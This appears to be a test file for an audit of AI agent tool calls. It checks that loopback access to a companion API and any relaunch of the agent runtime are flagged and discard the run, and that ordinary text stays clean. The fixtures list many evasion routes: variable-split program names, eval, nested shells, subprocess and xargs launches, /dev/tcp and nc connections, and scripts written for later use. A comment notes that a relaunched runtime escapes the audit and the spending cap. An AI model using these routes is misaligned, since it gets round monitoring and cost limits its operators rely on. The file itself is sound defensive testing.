    ['Write script', tool('Write', { file_path: 'outputs/fetch.py', content: "import urllib.request\nurllib.request.urlopen('http://localhost:43123/api/agents/rounds')\n" })],
    ['Write shell script', tool('Write', { file_path: 'outputs/get.sh', content: 'curl -s localhost/api/status\n' })],
    ['Write port built at run time', tool('Write', { file_path: 'outputs/get.js', content: "const url = 'localhost:' + port;\n" })],
    ['Edit', tool('Edit', { file_path: 'outputs/a.py', old_string: 'x', new_string: "BASE = 'http://[::1]:43123'" })],
    ['Read of a URL', tool('Read', { file_path: 'http://127.0.0.1:43123/api/status' })],
    ['echo of a URL', bash('echo http://localhost:43123/api/status > outputs/u.txt')],
    ['here document', bash("cat > outputs/x.py <<'EOF'\nimport requests\nrequests.get(f'http://localhost:{port}/api/status')\nEOF")],
    /* shell words, variables and nested shells */
    ['ssh', bash('ssh user@localhost cat notes.txt')],
    ['assignment', bash('H=localhost')],
    ['variables', bash('H=localhost; P=8; curl "http://$H:$P/api/status"')],
    ['variable host', bash('H=localhost; curl -s "$H:43123/x"')],
    ['bash -c', bash("bash -c 'curl localhost'")],
    ['substitution', bash('echo "$(curl -s localhost:43123/api/status)"')],
    ['description', tool('Bash', { command: 'ls outputs', description: 'curl http://127.0.0.1:43123/api/status' })],
  ];
  for (const [label, event] of forms) {
    const result = fx.audit(event);
    assert.equal(result.status, 'DISCARDED', `${label}: ${JSON.stringify(result.violations)}`);
    assert.ok(kinds(result).includes('loopback'), `${label} should be loopback: ${JSON.stringify(result.violations)}`);
  }
  const one = fx.audit(bash('curl -s http://127.0.0.1:43123/api/status'));
  assert.deepEqual(one.violations, [{ tool: 'Bash', kind: 'loopback', path: 'http://127.0.0.1:43123', call: 'curl -s http://127.0.0.1:43123/api/status' }], 'one reference, one violation');
  assert.deepEqual(kinds(fx.audit(bash('cat < /dev/tcp/localhost/43123'))), ['loopback'], '/dev/tcp to this machine is loopback, not abs');
  assert.deepEqual(kinds(fx.audit(bash('cat < /dev/tcp/example.com/443'))), ['abs'], '/dev/tcp elsewhere stays an access outside the folder');
});

test('loopback: with companionPort the companion port counts with any host; without it a plain host name and port do not', t => {
  const fx = fixture(t);
  const portForms = [
    bash('curl -s myhost:43123/api/status'),
    bash('curl -s "http://$NAME:43123/api/status"'),
    bash('curl -s http://myhost.example:43123/'),
    bash('echo GET | nc myhost 43123'),
    bash('echo hi > /dev/tcp/myhost/43123'),
    bash('PORT=43123 python3 outputs/client.py'),
    tool('Write', { file_path: 'outputs/client.yml', content: 'host: myhost\nport: 43123\n' }),
    tool('Write', { file_path: 'outputs/client.py', content: "conn = http.client.HTTPConnection('myhost', 43123)\n" }),
    tool('Write', { file_path: 'outputs/client.js', content: 'fetch(`http://${host}:43123/api/status`)\n' }),
  ];
  for (const event of portForms) {
    const withPort = fx.audit(event, { companionPort: COMPANION_PORT });
    assert.ok(kinds(withPort).includes('loopback'), JSON.stringify(event) + ' ' + JSON.stringify(withPort.violations));
    assert.equal(withPort.status, 'DISCARDED');
    assert.ok(!kinds(fx.audit(event)).includes('loopback'), 'without the option this is a host name and a port: ' + JSON.stringify(event));
  }
  assert.ok(kinds(fx.audit(bash('curl 127.0.0.1:8080'), { companionPort: COMPANION_PORT })).includes('loopback'), 'a loopback address is flagged on any port');
});

test('loopback: must-not-flag cases (a sentence that mentions localhost is free text, remote URLs, other ports, plain figures)', t => {
  const fx = fixture(t);
  const clean = [
    /* Decided: the bare word localhost in prose is free text. Only a host position (a URL, host:port, a quoted host, a
       shell word, a line that also names a network client) counts. */
    tool('Write', { file_path: 'outputs/memo.md', content: 'The old reporting server ran on localhost, so the figures were exported by hand.\n' }),
    tool('Edit', { file_path: 'outputs/memo.md', old_string: 'server', new_string: 'reporting server on localhost' }),
    bash('echo "the source system ran on localhost" > outputs/n.md'),
    bash("cat > outputs/memo.md <<'EOF'\nThe source system ran on localhost.\nRevenue was 43123 thousand.\nEOF"),
    /* remote URLs, also with ports */
    bash('curl -s https://example.com:8443/data.csv -o outputs/d.csv'),
    bash('wget -q https://files.example.org/a.csv -O outputs/a.csv'),
    tool('Write', { file_path: 'outputs/n.md', content: 'Source: https://example.com:8080/a and http://x.org/y' }),
    /* port numbers that are not the companion port, and the companion port as a plain figure */
    bash('curl -s http://example.com:8080/x -o outputs/x'),
    bash('echo 43123 >> outputs/figures.txt'),
    tool('Write', { file_path: 'outputs/t.csv', content: 'item,value\na,43123\nb,8080\n' }),
    bash('curl --retry 0 --max-time 0 https://example.com/a -o outputs/a'),
    /* numbers and slices that look like addresses */
    bash('python3 -c "a = [1, 2, 3]; print(a[::1], a[0:2], 127.5 / 3)"'),
    bash('echo "meeting at 10:30, ratio 0:5, version 10.0.0.1" > outputs/n.txt'),
    tool('Write', { file_path: 'outputs/m.md', content: 'Net debt fell 127.1 to 4,312.3; FY24:FY23 = 1.2x; a::b; [::2]' }),
    tool('Write', { file_path: 'outputs/k.py', content: "key = '::'.join(parts)\nhead, tail = key.split(\"::\")\n" }),
    bash('echo :: >> outputs/sep.txt'),
  ];
  for (const event of clean) {
    const result = fx.audit(event, { companionPort: COMPANION_PORT });
    assert.deepEqual(result.violations, [], JSON.stringify(event));
    assert.equal(result.status, 'CLEAN');
  }
});

test('loopback: companionPort is validated, and no option turns the rule off', t => {
  const fx = fixture(t);
  for (const companionPort of [0, 65536, -1, 1.5, NaN, '43123', [43123], {}]) {
    assert.throws(() => fx.audit(bash('ls'), { companionPort }), /companionPort/, JSON.stringify(companionPort));
  }
  for (const companionPort of [undefined, null, 1, 65535, COMPANION_PORT]) assert.equal(fx.audit(bash('ls'), { companionPort }).status, 'CLEAN');
  const reach = bash('curl -s http://localhost:43123/api/status');
  for (const extra of [{}, { allowLoopback: true }, { loopback: false }, { strict: false }, { allowedHosts: ['localhost'] }, { companionPort: 8080 }]) {
    assert.equal(fx.audit(reach, extra).status, 'DISCARDED', JSON.stringify(extra));
  }
});

test('loopback: a text full of loopback references costs no more than one with a few, and a huge expanded word fails closed', t => {
  const fx = fixture(t);
  const started = Date.now();
  for (const content of ['"localhost" '.repeat(80000), '127.0.0.1 '.repeat(100000), ':43123 '.repeat(140000), 'curl localhost\n'.repeat(60000)]) {
    const result = fx.audit(tool('Write', { file_path: 'outputs/x.txt', content }), { companionPort: COMPANION_PORT });
    assert.equal(result.status, 'DISCARDED');
    assert.deepEqual(kinds(result), ['loopback'], 'one reference repeated is one violation');
  }
  assert.ok(Date.now() - started < 3000, `the scan took ${Date.now() - started} ms`);
  const doubled = fx.audit(bash('X=0123456789; ' + 'X=$X$X; '.repeat(18) + 'echo $X'));
  assert.equal(doubled.status, 'DISCARDED');
  assert.ok(doubled.notes.some(note => /^audit-error: .*expanded word is too long/.test(note)), doubled.notes.join(' | '));
});

/* ------------------------------------------------------------------ the agent runtime: a pilot that starts another claude */

/* A pilot's shell can start the runtime again. That process runs under the writer's sign-in with no spending cap (only
   the process the Studio starts gets --max-budget-usd) and its tool calls are never audited, so naming the runtime as a
   program anywhere in a tool input discards the run. */
const RUNTIME_BIN = '/opt/synthetic-tools/bin/claude';

test('runtime: every way of starting the agent runtime from a tool call is a violation of its own kind, and it discards the run', t => {
  const fx = fixture(t);
  const env = { CLAUDE_BIN: RUNTIME_BIN };
  const forms = [
    /* the shell, by name, with or without a wrapper, and as an argument of a command that starts its arguments */
    ['bare name', bash('claude -p "summarise filesystem/a.csv" > outputs/a.txt')],
    ['no prompt', bash('echo hi | claude')],
    ['other case', bash('Claude --print x')],
    ['allowlisted folder', bash('/usr/local/bin/claude -p x')],
    ['wrappers', bash('nohup timeout 600 env FOO=1 claude -p x &')],
    ['xargs', bash('xargs claude -p < outputs/questions.txt')],
    ['find -exec', bash('find filesystem -name "*.txt" -exec claude -p {} \;')],
    ['which', bash('which claude')],
    ['variable', bash('C=claude; $C -p x')],
    ['variable pieces', bash('A=cla; B=ude; "$A$B" -p x')],
    ['inherited CLAUDE_BIN', bash('"$CLAUDE_BIN" -p x')],
    ['bash -c', bash("bash -c 'claude -p x'")],
    ['eval', bash('eval "claude -p x"')],
    ['substitution', bash('echo "$(claude -p x)" > outputs/a.txt')],
    ['npx', bash('npx @anthropic-ai/claude-code -p x')],
    ['description', tool('Bash', { command: 'ls outputs', description: 'claude -p "check the outputs"' })],
    /* code that starts a program by name */
    ['python subprocess', bash(`python3 -c "import subprocess; subprocess.run(['claude', '-p', 'x'])"`)],
    ['python os.system', bash(`python3 -c "import os; os.system('claude -p x')"`)],
    ['node execFile', bash(`node -e "require('child_process').execFileSync('claude', ['-p', 'x'])"`)],
    ['here document', bash("python3 - <<'EOF'\nimport subprocess\nsubprocess.run(['claude', '--print', 'x'])\nEOF")],
    /* a file written now and run later */
    ['Write script', tool('Write', { file_path: 'outputs/run.sh', content: '#!/bin/sh\nclaude -p "do the task" > outputs/a.txt\n' })],
    ['Write code with a path', tool('Write', { file_path: 'outputs/r.py', content: 'import subprocess\nsubprocess.run(["/usr/local/bin/claude", "-p", "x"])\n' })],
    ['Edit', tool('Edit', { file_path: 'outputs/r.js', old_string: 'x', new_string: "spawn('claude', ['-p', prompt])" })],
  ];
  for (const [label, event] of forms) {
    const result = fx.audit(event, { env });
    assert.equal(result.status, 'DISCARDED', `${label}: ${JSON.stringify(result.violations)}`);
    assert.ok(kinds(result).includes('runtime'), `${label} should be runtime: ${JSON.stringify(result.violations)}`);
  }
  const one = fx.audit(bash('claude -p "hi"'));
  assert.deepEqual(one.violations, [{ tool: 'Bash', kind: 'runtime', path: 'claude', call: 'claude -p "hi"' }], 'one reference, one violation');
});

test('runtime: with runtimeBin the runtime path, its real path and its file name count too', t => {
  const fx = fixture(t);
  /* A runtime installed under another name, in a folder the audit otherwise lets a pilot run programs from. */
  const other = '/usr/local/bin/synthetic-agent';
  for (const event of [bash(`${other} -p x`), bash('synthetic-agent -p x'), tool('Write', { file_path: 'outputs/a.txt', content: `run ${other} later` })]) {
    assert.ok(kinds(fx.audit(event, { runtimeBin: other })).includes('runtime'), JSON.stringify(event));
    assert.deepEqual(fx.audit(event).violations, [], 'without runtimeBin this name is an ordinary program: ' + JSON.stringify(event));
  }
  /* A symlink to the runtime: the link and the file it points to are the same program. */
  const real = path.join(fx.base, 'install', 'agent-cli.js');
  fs.mkdirSync(path.dirname(real), { recursive: true });
  fs.writeFileSync(real, '#!/bin/sh\n');
  const link = path.join(fx.base, 'bin', 'agent');
  fs.mkdirSync(path.dirname(link), { recursive: true });
  fs.symlinkSync(real, link);
  const viaReal = fx.audit(bash(`${real} -p x`), { runtimeBin: link });
  assert.ok(kinds(viaReal).includes('runtime'), JSON.stringify(viaReal.violations));
  const viaLink = fx.audit(bash(`node ${path.relative(fx.folder, link)} -p x`), { runtimeBin: real });
  assert.ok(kinds(viaLink).includes('runtime'), 'a relative path through the link: ' + JSON.stringify(viaLink.violations));
});

test('runtime: must-not-flag cases (claude in a sentence, names that only contain it, the pilot own configuration folder)', t => {
  const fx = fixture(t);
  const clean = [
    bash('echo "Answer prepared by Claude" > outputs/a.md'),
    bash('cat filesystem/claude_notes.txt; ls filesystem/claude-2024'),
    bash('ls .tmp/claude-config/projects; echo "$CLAUDE_CONFIG_DIR"'),
    tool('Read', { file_path: '.tmp/claude-config/projects/x/tool-results/y.txt' }),
    tool('Write', { file_path: 'outputs/memo.md', content: 'Claude Shannon wrote about information. "Claude is here" is a quote.\nSee https://claude.example/claude and a.claude -p.\n- claude\n-p is not an option of the line above\n' }),
    tool('Write', { file_path: 'outputs/t.csv', content: 'name,value\nclaude,3\nmyclaude -p,4\n' }),
  ];
  for (const event of clean) {
    const result = fx.audit(event, { runtimeBin: RUNTIME_BIN, env: { CLAUDE_CONFIG_DIR: path.join(fx.folder, '.tmp', 'claude-config') } });
    assert.deepEqual(result.violations, [], JSON.stringify(event));
    assert.equal(result.status, 'CLEAN');
  }
});

test('runtime: runtimeBin is validated, no option turns the rule off, and a text full of the name stays fast', t => {
  const fx = fixture(t);
  for (const runtimeBin of ['claude', 'bin/claude', 42, {}, ['/x/claude'], '/x/\0claude']) {
    assert.throws(() => fx.audit(bash('ls'), { runtimeBin }), /runtimeBin/, JSON.stringify(runtimeBin));
  }
  for (const runtimeBin of [undefined, null, RUNTIME_BIN]) assert.equal(fx.audit(bash('ls'), { runtimeBin }).status, 'CLEAN');
  const start = bash('claude -p x');
  for (const extra of [{}, { allowRuntime: true }, { runtime: false }, { strict: false }, { runtimeBin: '/elsewhere/other' }]) {
    assert.equal(fx.audit(start, extra).status, 'DISCARDED', JSON.stringify(extra));
  }
  const started = Date.now();
  for (const content of ['claude '.repeat(140000), '/claude/'.repeat(120000), ('a'.repeat(290) + '/claude"\'').repeat(3000), "x/claude' ".repeat(100000)]) {
    /* /claude/claude/... is an absolute path (abs), but nowhere is the runtime named as a program. */
    assert.ok(!kinds(fx.audit(tool('Write', { file_path: 'outputs/x.txt', content }), { runtimeBin: RUNTIME_BIN })).includes('runtime'), content.slice(0, 40));
  }
  const many = fx.audit(tool('Write', { file_path: 'outputs/x.sh', content: 'claude -p x\n'.repeat(80000) }), { runtimeBin: RUNTIME_BIN });
  assert.deepEqual(kinds(many), ['runtime'], 'one reference repeated is one violation');
  assert.ok(Date.now() - started < 3000, `the scan took ${Date.now() - started} ms`);
});
